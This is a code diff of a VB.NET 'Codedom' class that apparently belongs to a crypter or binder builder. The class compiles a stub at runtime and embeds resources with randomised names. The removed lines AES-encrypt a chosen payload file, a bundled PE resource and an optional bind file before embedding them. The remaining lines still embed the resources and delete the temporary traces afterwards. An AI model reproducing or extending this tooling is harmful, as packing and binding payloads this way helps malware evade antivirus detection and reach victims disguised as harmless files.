@@ -1,12 +1,12 @@
 ﻿Imports System.CodeDom.Compiler
 
 Public Class Codedom
-    Public Shared ResName As String = Helper.Randomi(Helper.rand.Next(6, 12))
-    Public Shared ResPayload = Helper.Randomi(Helper.rand.Next(5, 10))
-    Public Shared ResDLL = Helper.Randomi(Helper.rand.Next(5, 10))
-    Public Shared ResBind = Helper.Randomi(Helper.rand.Next(5, 10))
+
 
     Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String)
+
+
+
         Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
@@ -27,15 +27,7 @@ Public Class Codedom
             .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
             .ReferencedAssemblies.Add(Application.ExecutablePath)
 
-            Dim rw As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
-            rw.AddResource(ResPayload, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(IO.File.ReadAllBytes(Main.txtPayload.Text)), Main.Key))
-            rw.AddResource(ResDLL, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(My.Resources.PE), Main.Key))
-            If Main.chkBind.Checked = True AndAlso IO.File.Exists(Main.txtBind.Text) = True Then
-                rw.AddResource(ResBind, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(IO.File.ReadAllBytes(Main.txtBind.Text)), Main.Key))
-
-            End If
-            rw.Close()
-            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + ResName + ".Resources")
+            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Main.ResName + ".Resources")
 
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
             If Results.Errors.Count > 0 Then
@@ -76,7 +68,7 @@ Public Class Codedom
         End With
 
         Try
-            IO.File.Delete(IO.Path.GetTempPath + "\" + ResName + ".Resources")
+            IO.File.Delete(IO.Path.GetTempPath + "\" + Main.ResName + ".Resources")
             IO.File.Delete(Application.StartupPath + "\" + IO.Path.GetFileName(Main.OutputPayload) + ".hash")
         Catch ex As Exception
         End Try
